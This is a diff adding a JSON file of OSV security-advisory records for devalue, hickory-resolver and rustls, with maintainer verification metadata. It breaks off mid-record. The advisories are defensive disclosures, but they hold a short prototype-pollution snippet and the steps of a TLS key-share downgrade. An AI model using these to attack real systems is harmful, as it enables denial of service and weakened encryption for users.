@@ -1,0 +1,1342 @@
+{
+  "checkedAt": "2026-11-08T21:08:30.554913Z",
+  "records": [
+    {
+      "id": "GHSA-x5rw-q4pp-hg5g",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-x5rw-q4pp-hg5g",
+      "checkedAt": "2026-11-08T21:08:13.580647Z",
+      "sha256": "4bcb6279696c779d1ea7ecb875e9950d5bca8714cc9750b11efe3d2308090e7a",
+      "maintainerVerification": {
+        "id": "GHSA-x5rw-q4pp-hg5g",
+        "osvModifiedAt": "2026-11-08T10:56:11.899025413Z",
+        "aliases": [
+          "CVE-2026-123562"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/sveltejs/devalue/security-advisories/GHSA-x5rw-q4pp-hg5g",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:06:52.544665Z",
+        "sha256": "0177be0639c05fbe92ddd12e72d79f3b2f4abdfead5a0690b1688f0ca8f1f394",
+        "maintainer": {
+          "ghsa_id": "GHSA-x5rw-q4pp-hg5g",
+          "cve_id": null,
+          "summary": "stringifyAsync can cause an unhandled rejection despite a caught returned promise",
+          "description": "When serializing multiple promises, a later promise can reject before an earlier one settles. An internal rejected promise remains unhandled even if the caller catches the returned `stringifyAsync` promise. Under Node's default unhandled-rejection behavior this can terminate the process. Applications whose asynchronous failures/timing can be influenced by requests are potentially exposed.\r\n\r\nThis is essentially impossible to exploit, and is much more likely to surface as a developer-introduced bug.",
+          "published_at": "2026-09-18T18:40:18Z",
+          "updated_at": "2026-09-18T18:40:18Z",
+          "withdrawn_at": null,
+          "severity": "low",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "npm",
+                "name": "devalue"
+              },
+              "vulnerable_version_range": ">= 5.8.0, <= 5.9.2",
+              "patched_versions": "5.9.3",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-x5rw-q4pp-hg5g",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-hx4r-w6wj-j8fg",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-hx4r-w6wj-j8fg",
+      "checkedAt": "2026-11-08T21:08:13.604861Z",
+      "sha256": "76b210ad0890aaa8a08e11e6fff3df7d044d41b87fa72c11b3bbd6dfbc345df2",
+      "maintainerVerification": {
+        "id": "GHSA-hx4r-w6wj-j8fg",
+        "osvModifiedAt": "2026-11-08T10:56:11.387612861Z",
+        "aliases": [
+          "CVE-2026-123566"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/sveltejs/devalue/security-advisories/GHSA-hx4r-w6wj-j8fg",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:06:52.495222Z",
+        "sha256": "ecaaf47f528358c4c75723d9013295381d43abd117cb5a138f6c3ea633e3bc5b",
+        "maintainer": {
+          "ghsa_id": "GHSA-hx4r-w6wj-j8fg",
+          "cve_id": null,
+          "summary": "Residual sparse-array CPU amplification in uneval",
+          "description": "`uneval` performs synchronous work proportional to a sparse array's declared length. An application that passes attacker-influenced sparse values to `uneval` can suffer event-loop blocking. Since attacker-controlled creation of sparse arrays is so difficult, this vulnerability is very difficult to exploit.",
+          "published_at": "2026-09-18T18:42:31Z",
+          "updated_at": "2026-09-18T18:42:31Z",
+          "withdrawn_at": null,
+          "severity": "medium",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "npm",
+                "name": "devalue"
+              },
+              "vulnerable_version_range": "<= 5.9.2",
+              "patched_versions": "5.9.3",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-hx4r-w6wj-j8fg",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-r9w8-h9r3-54w4",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-r9w8-h9r3-54w4",
+      "checkedAt": "2026-11-08T21:08:13.604183Z",
+      "sha256": "3d5b4e6b3d117e39e3283baa584dfa8c687052ddf350002d88c97422c732c512",
+      "maintainerVerification": {
+        "id": "GHSA-r9w8-h9r3-54w4",
+        "osvModifiedAt": "2026-11-08T10:56:12.205727459Z",
+        "aliases": [
+          "CVE-2026-123563"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/sveltejs/devalue/security-advisories/GHSA-r9w8-h9r3-54w4",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:06:52.511037Z",
+        "sha256": "3585749984b74ffa7724eb3067c7286c9c32d8fd9b4f92bfc4cb9cabe7302a1f",
+        "maintainer": {
+          "ghsa_id": "GHSA-r9w8-h9r3-54w4",
+          "cve_id": null,
+          "summary": "Custom ArrayBuffer revivers can bypass typed-array allocation validation",
+          "description": "Under very specific  circumstances, `parse` could create massive ArrayBuffers with very small input. This required a malformed `ArrayBuffer` custom reviver.\r\n",
+          "published_at": "2026-09-18T18:40:49Z",
+          "updated_at": "2026-09-18T18:40:50Z",
+          "withdrawn_at": null,
+          "severity": "low",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "npm",
+                "name": "devalue"
+              },
+              "vulnerable_version_range": "<= 5.9.2",
+              "patched_versions": "5.9.3",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-r9w8-h9r3-54w4",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-33hq-fvwr-56pm",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-33hq-fvwr-56pm",
+      "checkedAt": "2026-11-08T21:08:13.544412Z",
+      "sha256": "ca29389a493a55888fa6c4dc7b66bc18fafad8ca0e6f2d54ec0fc56a14c23650",
+      "maintainerVerification": {
+        "id": "GHSA-33hq-fvwr-56pm",
+        "osvModifiedAt": "2026-11-08T10:56:07.976258791Z",
+        "aliases": [
+          "CVE-2026-123569"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/sveltejs/devalue/security-advisories/GHSA-33hq-fvwr-56pm",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:06:52.535726Z",
+        "sha256": "69fbb7bd79b40c6f4917987137a0908edade4bc83ddd04fca2a9d0a2e9d3cf25",
+        "maintainer": {
+          "ghsa_id": "GHSA-33hq-fvwr-56pm",
+          "cve_id": null,
+          "summary": "CPU and memory amplification from sparse arrays",
+          "description": "Under certain circumstances, serializing sparse arrays using `uneval` or `stringify` could cause CPU and/or memory exhaustion. When this occurs on the server, it results in a DoS. This is extremely difficult to take advantage of in practice, as an attacker would have to manage to create a sparse array on the server — which is impossible in every mainstream wire format — and then that sparse array would have to be run through `uneval` or `stringify`.",
+          "published_at": "2026-02-18T20:31:30Z",
+          "updated_at": "2026-02-18T20:31:31Z",
+          "withdrawn_at": null,
+          "severity": "low",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "npm",
+                "name": "devalue"
+              },
+              "vulnerable_version_range": "<=5.6.2",
+              "patched_versions": "5.6.3",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-33hq-fvwr-56pm",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-mwv9-gp5h-frr4",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-mwv9-gp5h-frr4",
+      "checkedAt": "2026-11-08T21:08:13.581272Z",
+      "sha256": "ef136e6520ab50e4a3b2b38e7d048dab787b835e798d851a40fe5144dee165ce",
+      "maintainerVerification": {
+        "id": "GHSA-mwv9-gp5h-frr4",
+        "osvModifiedAt": "2026-11-08T10:56:14.491676861Z",
+        "aliases": [
+          "CVE-2026-123567"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/sveltejs/devalue/security-advisories/GHSA-mwv9-gp5h-frr4",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:06:56.841903Z",
+        "sha256": "d819c27e7221e4661e1629016a002dbb91260420d6a6f5f2c65b7222f0d8bbb3",
+        "maintainer": {
+          "ghsa_id": "GHSA-mwv9-gp5h-frr4",
+          "cve_id": null,
+          "summary": "`devalue.parse` and `devalue.unflatten` emit objects with `__proto__` own properties",
+          "description": "In some circumstances, `devalue.parse` and `devalue.unflatten` could emit objects with `__proto__` own properties. This in and of itself is not a security vulnerability (and is possible with, for example, `JSON.parse` as well), but it can result in prototype injection if _downstream_ code handles it incorrectly:\r\n\r\n```ts\r\nconst result = devalue.parse(/* input creating an object with a __proto__ property */);\r\nconst target = {};\r\nObject.assign(target, result); // target's prototype is now polluted\r\n```",
+          "published_at": "2026-03-11T16:50:02Z",
+          "updated_at": "2026-03-11T16:50:03Z",
+          "withdrawn_at": null,
+          "severity": "low",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "npm",
+                "name": "devalue"
+              },
+              "vulnerable_version_range": "<= 5.6.3",
+              "patched_versions": "5.6.4",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-mwv9-gp5h-frr4",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-4q55-j62x-fr9h",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-4q55-j62x-fr9h",
+      "checkedAt": "2026-11-08T21:08:17.996720Z",
+      "sha256": "bf82b64b10d5dc991a1ed919d4796e4e3789b3622968e918716e75e82ae27f80",
+      "maintainerVerification": {
+        "id": "GHSA-4q55-j62x-fr9h",
+        "osvModifiedAt": "2026-11-08T10:56:13.484927650Z",
+        "aliases": [
+          "CVE-2026-123561"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/sveltejs/devalue/security-advisories/GHSA-4q55-j62x-fr9h",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:06:56.819716Z",
+        "sha256": "7a8c0d7268bc365c1454e7786fcc89c3d987113208b5e6f5461bbf5738d36ac1",
+        "maintainer": {
+          "ghsa_id": "GHSA-4q55-j62x-fr9h",
+          "cve_id": null,
+          "summary": "Malformed null-prototype object keys bypass __proto__ rejection via property-key coercion | pkg:npm/devalue@5.9.2",
+          "description": "This is another instance of https://github.com/sveltejs/devalue/security/advisories/GHSA-mwv9-gp5h-frr4, where some payloads could cause `parse` to create objects with a `__proto__` own property. This on its own is not enough to cause prototype pollution, and indeed this is actually how `JSON.parse` works, but we decided to be a little more defensive here and not allow the creation of objects with `__proto__` own-properties. It is very unlikely for this to cause any issues.",
+          "published_at": "2026-09-18T18:39:52Z",
+          "updated_at": "2026-09-18T18:39:52Z",
+          "withdrawn_at": null,
+          "severity": "low",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "npm",
+                "name": "devalue"
+              },
+              "vulnerable_version_range": "<= 5.9.2",
+              "patched_versions": "5.9.3",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-4q55-j62x-fr9h",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-8qm3-746x-r74r",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-8qm3-746x-r74r",
+      "checkedAt": "2026-11-08T21:08:18.008541Z",
+      "sha256": "8205db889a4cefe9647b3e58d46d50957292608a68c2304504b812d92517568f",
+      "maintainerVerification": {
+        "id": "GHSA-8qm3-746x-r74r",
+        "osvModifiedAt": "2026-11-08T10:56:11.293593905Z",
+        "aliases": [
+          "CVE-2026-123568"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/sveltejs/devalue/security-advisories/GHSA-8qm3-746x-r74r",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:06:56.897863Z",
+        "sha256": "d8bd21d4d438933a12ce1a1a96b1c23e6ee327b40fba5ba2cead1394fd7a61ee",
+        "maintainer": {
+          "ghsa_id": "GHSA-8qm3-746x-r74r",
+          "cve_id": null,
+          "summary": "`uneval`ed code can create objects with polluted prototypes when `eval`ed",
+          "description": "Under certain circumstances, `uneval`ing untrusted data can produce output code that will create objects with polluted prototypes when later `eval`ed, meaning the output data can be a different shape from the input data.",
+          "published_at": "2026-02-18T20:31:19Z",
+          "updated_at": "2026-02-18T20:31:19Z",
+          "withdrawn_at": null,
+          "severity": "low",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": "CVSS:4.0/AV:N/AC:H/AT:P/PR:H/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
+              "score": 2.1
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "npm",
+                "name": "devalue"
+              },
+              "vulnerable_version_range": "<=5.6.2",
+              "patched_versions": "5.6.3",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-8qm3-746x-r74r",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-mcm9-63f2-9j32",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-mcm9-63f2-9j32",
+      "checkedAt": "2026-11-08T21:08:17.997190Z",
+      "sha256": "ce4da0e69f4c24c94d6ee6f3d5fa3db08350cde45a5831db2c1e8d49cecd5b15",
+      "maintainerVerification": {
+        "id": "GHSA-mcm9-63f2-9j32",
+        "osvModifiedAt": "2026-11-08T10:56:13.292191726Z",
+        "aliases": [
+          "CVE-2026-123565"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/sveltejs/devalue/security-advisories/GHSA-mcm9-63f2-9j32",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:06:56.826314Z",
+        "sha256": "8f0f1fc9775257d2729e3fb464ad7ac456dc0ab92e3ed4537cf79604b82e502e",
+        "maintainer": {
+          "ghsa_id": "GHSA-mcm9-63f2-9j32",
+          "cve_id": null,
+          "summary": "Repeated primitive strings cause quadratic expansion in uneval",
+          "description": "Under very constrained circumstances, data that was `parse`d and then passed to `uneval` could turn a small payload into a very large serialized string.",
+          "published_at": "2026-09-18T18:42:08Z",
+          "updated_at": "2026-09-18T18:42:08Z",
+          "withdrawn_at": null,
+          "severity": "medium",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "npm",
+                "name": "devalue"
+              },
+              "vulnerable_version_range": "<= 5.9.2",
+              "patched_versions": "5.9.3",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-mcm9-63f2-9j32",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-wf3x-273g-mvxv",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-wf3x-273g-mvxv",
+      "checkedAt": "2026-11-08T21:08:18.428314Z",
+      "sha256": "2826caaa5af29e0ee6934374155733cbb9ff5af3fd1678195991f04250d16ade",
+      "maintainerVerification": {
+        "id": "GHSA-wf3x-273g-mvxv",
+        "osvModifiedAt": "2026-11-08T10:56:08.686140515Z",
+        "aliases": [
+          "CVE-2026-123564"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/sveltejs/devalue/security-advisories/GHSA-wf3x-273g-mvxv",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:00.793073Z",
+        "sha256": "ef401a8c4d8ed9b4f8c7161670a2063842d8a41d26aec2a38f2fab99aa41a0e6",
+        "maintainer": {
+          "ghsa_id": "GHSA-wf3x-273g-mvxv",
+          "cve_id": null,
+          "summary": "Sparse arrays emitted by uneval cause eager allocation when evaluated",
+          "description": "Evaluating legitimate `uneval` output for a sparse array can allocate memory proportional to its declared length. A tiny serialized value can therefore cause large memory allocation in a consuming browser/runtime. This occurs during evaluation of generated code, not in default `parse` sparse-array construction.\r\n\r\nYou would only be affected by this if you were serializing very large sparse arrays and then evaluating the results. In the general use case for `uneval` of sending data to the client, the worst that could happen is the browser tab running out of memory.",
+          "published_at": "2026-09-18T18:41:44Z",
+          "updated_at": "2026-09-18T18:41:44Z",
+          "withdrawn_at": null,
+          "severity": "low",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "npm",
+                "name": "devalue"
+              },
+              "vulnerable_version_range": ">= 1.0.0, <= 5.9.2",
+              "patched_versions": "5.9.3",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-wf3x-273g-mvxv",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-6w6g-hm98-mhgm",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-6w6g-hm98-mhgm",
+      "checkedAt": "2026-11-08T21:08:18.000569Z",
+      "sha256": "f28a53486f6fe3a7dcdaac85b3bac76ceb610b2119581c4aaff2aaef07a350f2",
+      "maintainerVerification": {
+        "id": "GHSA-6w6g-hm98-mhgm",
+        "osvModifiedAt": "2026-11-08T10:56:09.807310548Z",
+        "aliases": [
+          "CVE-2026-123604"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/hickory-dns/hickory-dns/security-advisories/GHSA-6w6g-hm98-mhgm",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:00.797854Z",
+        "sha256": "2baea76000d7e77d9b65885d4abcb88642e2a7a86c781f1a97a572003f919879",
+        "maintainer": {
+          "ghsa_id": "GHSA-6w6g-hm98-mhgm",
+          "cve_id": null,
+          "summary": "Unbounded TC-retry loop in `NameServerPool::try_send` (resource-exhaustion DoS)",
+          "description": "When the `hickory-resolver` name server pool implementation receives an upstream response with the TC (truncated) header bit set, it re-queues the request to the same nameserver to retry with UDP transport disabled. However, the retry arm never inspects the transport that just answered and carries no iteration counter. An authoritative server that sets `TC=1` on **every** available transport  keeps the resolver spinning on one persistent TCP connection until the 5s per-request wall-clock deadline expires.\r\n\r\n### Reporter\r\n\r\nQifan Zhang, Palo Alto Networks",
+          "published_at": "2026-09-03T21:42:55Z",
+          "updated_at": "2026-09-03T21:42:56Z",
+          "withdrawn_at": null,
+          "severity": "high",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "rust",
+                "name": "hickory-resolver"
+              },
+              "vulnerable_version_range": "0.26.0-beta.1 ... 0.26.1",
+              "patched_versions": "0.26.2",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-6w6g-hm98-mhgm",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "updated_existing",
+      "addedAliases": [
+        "CVE-2026-123604"
+      ]
+    },
+    {
+      "id": "GHSA-w44r-93j7-qv28",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-w44r-93j7-qv28",
+      "checkedAt": "2026-11-08T21:08:21.968577Z",
+      "sha256": "0baef6915d07f2d798b6abe47dbc9bc3723b186ceec7b401963dc4bed7d16e64",
+      "maintainerVerification": {
+        "id": "GHSA-w44r-93j7-qv28",
+        "osvModifiedAt": "2026-11-08T10:55:46.312019109Z",
+        "aliases": [
+          "CVE-2026-123611",
+          "RUSTSEC-2026-0349"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/rustls/rustls/security-advisories/GHSA-w44r-93j7-qv28",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:00.734621Z",
+        "sha256": "4f97698332fa30f67bf75825db9a6de0e26c460ddceee844aa3c2404fc4a5f3f",
+        "maintainer": {
+          "ghsa_id": "GHSA-w44r-93j7-qv28",
+          "cve_id": null,
+          "summary": "An unauthenticated ServerHello poisons the per-name key-exchange record, so later ClientHellos carry only a classical X25519 share",
+          "description": "## Summary\r\n\r\nThe client records the server-selected key-exchange group per server name when it processes the ServerHello, before the server is authenticated. A network attacker can answer one connection attempt for a target name with a ServerHello that selects X25519 and close the connection. Later ClientHellos for that name carry one X25519 share while supported_groups still lists X25519MLKEM768 first. If the server accepts that share instead of sending a HelloRetryRequest, the handshake completes with classical key exchange only and no error.\r\n\r\nAn attacker that answers one connection attempt for the target name with a ServerHello selecting X25519 changes every later ClientHello of that client for that name, for as long as the entry stays in the store. No certificate or completed handshake is needed: it parses the ClientHello, sends the ServerHello, and closes.\r\n\r\nTLS 1.3 transcript binding stops an on-path attacker from editing the ClientHello of one connection. It does not stop the attacker from steering the client's prediction state beforehand, because that state is written from an unauthenticated message.\r\n\r\n## What does not trigger it\r\n\r\n- Servers that send a HelloRetryRequest. The connection stays hybrid and costs one extra round trip.\r\n- A client configuration with resumption disabled: nothing is stored.\r\n- A different server name: the record is per name.\r\n\r\n## Impact\r\n\r\nIf the genuine server picks the group for which a share is present, instead of sending a HelloRetryRequest for its preferred hybrid group, the handshake completes with classical key exchange only, between two peers that both support the hybrid group. No error is raised. The confidentiality of recorded sessions against a future quantum adversary is lost for those connections (harvest now, decrypt later). There is no key compromise and no authentication bypass.\r\n\r\nNote that this behaviour is discussed at length in [draft-ietf-tls-key-share-prediction](https://www.ietf.org/archive/id/draft-ietf-tls-key-share-prediction-01.html#name-security-considerations) so the actual security impact is largely down to a server policy decision.",
+          "published_at": "2026-10-14T09:55:05Z",
+          "updated_at": "2026-10-14T09:55:05Z",
+          "withdrawn_at": null,
+          "severity": "low",
+          "cvss": {
+            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+            "score": 3.7
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+              "score": 3.7
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "rust",
+                "name": "rustls"
+              },
+              "vulnerable_version_range": "< 0.23.46",
+              "patched_versions": ">= 0.23.46, >= 0.24.0-dev.2",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-w44r-93j7-qv28",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "updated_existing",
+      "addedAliases": [
+        "CVE-2026-123611"
+      ]
+    },
+    {
+      "id": "GHSA-h2v8-394m-p7vv",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-h2v8-394m-p7vv",
+      "checkedAt": "2026-11-08T21:08:21.980576Z",
+      "sha256": "c56ec994f02e744dff38fc170ea184b2727a88298ef74e50bf74bd1336aee72d",
+      "maintainerVerification": {
+        "id": "GHSA-h2v8-394m-p7vv",
+        "osvModifiedAt": "2026-11-08T10:55:59.261359726Z",
+        "aliases": [
+          "CVE-2026-123610",
+          "RUSTSEC-2026-0348"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/rustls/rustls/security-advisories/GHSA-h2v8-394m-p7vv",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:00.933652Z",
+        "sha256": "87436a05729734c45a11e1e278651965f9da47bbc8875da120a8e1ebdd77b794",
+        "maintainer": {
+          "ghsa_id": "GHSA-h2v8-394m-p7vv",
+          "cve_id": null,
+          "summary": "Brotli certificate decompression can allocate an attacker-controlled amount of memory up to 1 GiB before authentication.",
+          "description": "### Summary\r\n\r\nThe built-in (but disabled by default) Brotli certificate decoder bounds the output buffer but accepts an input-selected history window. A header of five bytes can specify a 1 GiB window allocation. A peer can abort a process whose allocator cannot satisfy that request. A client must enable Brotli and connect to the peer; a server must enable Brotli and request a client certificate. Neither direction requires a trusted attacker certificate.\r\n\r\n### Details\r\n\r\nrustls calls `BrotliDecompress` which enables Brotli's large-window extension. rustls applies a limit to certificates, but this applies to the decompressed result, and not to any internal allocations the process requires.\r\n\r\n### Impact\r\n\r\nClient applications that enable the `brotli` feature will be vulnerable to malicious servers. Server applications that enable the `brotli` feature and enable client authentication will be vulnerable to malicious clients.\r\n\r\nPotential for denial of service due to memory exhaustion from peers sending malicious Brotli-encoded certificates, for applications that enable Brotli decompression.\r\n\r\n### Acknowlegement\r\nThanks to OpenAI [OutboundDisclosures@openai.com](mailto:OutboundDisclosures@openai.com) for the disclosure.",
+          "published_at": "2026-10-14T09:54:52Z",
+          "updated_at": "2026-10-14T09:54:53Z",
+          "withdrawn_at": null,
+          "severity": "low",
+          "cvss": {
+            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "score": 3.7
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "score": 3.7
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "rust",
+                "name": "rustls"
+              },
+              "vulnerable_version_range": "< 0.23.46",
+              "patched_versions": ">= 0.23.46, >= 0.24.0-dev.2",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-h2v8-394m-p7vv",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "updated_existing",
+      "addedAliases": [
+        "CVE-2026-123610"
+      ]
+    },
+    {
+      "id": "GHSA-vp88-798v-h67f",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-vp88-798v-h67f",
+      "checkedAt": "2026-11-08T21:08:21.880749Z",
+      "sha256": "7cd4123b51f02c01049b5fa0daed73f8c06185cd520c8060e56a33ae99f0e56b",
+      "maintainerVerification": {
+        "id": "GHSA-vp88-798v-h67f",
+        "osvModifiedAt": "2026-11-08T10:55:39.094187294Z",
+        "aliases": [
+          "CVE-2026-123612",
+          "RUSTSEC-2026-0347"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/rustls/rustls/security-advisories/GHSA-vp88-798v-h67f",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:04.735089Z",
+        "sha256": "ea0718a859388900dc1cf7ee9eeed581f8c59f1e4b7e03c3bb59f6f96456eee8",
+        "maintainer": {
+          "ghsa_id": "GHSA-vp88-798v-h67f",
+          "cve_id": null,
+          "summary": "ECH rejection can expose buffered application data to authenticated outer server before `ech_required` alert",
+          "description": "In rustls 0.23.44 and 0.23.45, application data that a client buffers before the handshake completes is sent to the server even when the server rejects Encrypted Client Hello (ECH).\r\n\r\nWhen the server rejects ECH, the client completes the handshake with the outer ClientHello and authenticates the server against the ECH config's `public_name`. At the end of the handshake, `start_traffic()` encrypts and queues any plaintext buffered by `ClientConnection::writer()`. It does this *before* checking for `EchStatus::Rejected` and queueing the `ech_required` alert.\r\n\r\nThe application then receives `Error::PeerIncompatible(ServerRejectedEncryptedClientHello)`, as expected. However, the client is still expected to call `write_tls()` to send the fatal alert, and that call also sends the encrypted application data. The server decrypts the data and only then receives the alert.\r\n\r\nThe ordering bug is older than 0.23.44. Before 0.23.44, the client checked the server certificate against the inner server name rather than `public_name`, so a correctly configured server failed certificate verification first and no data was sent. 0.23.44 fixed that check, which makes the ordinary rejection path reachable.\r\n\r\n# Impact\r\n\r\nPlaintext meant for the inner server, the one named in the encrypted ClientHello, goes to the client-facing server identified by `public_name`. That server is properly authenticated, so this is not an attack by an unauthenticated party. However this violates [RFC 9849](https://www.rfc-editor.org/info/rfc9849), which says the following:\r\n\r\n- Section 6.1.6: if the handshake and 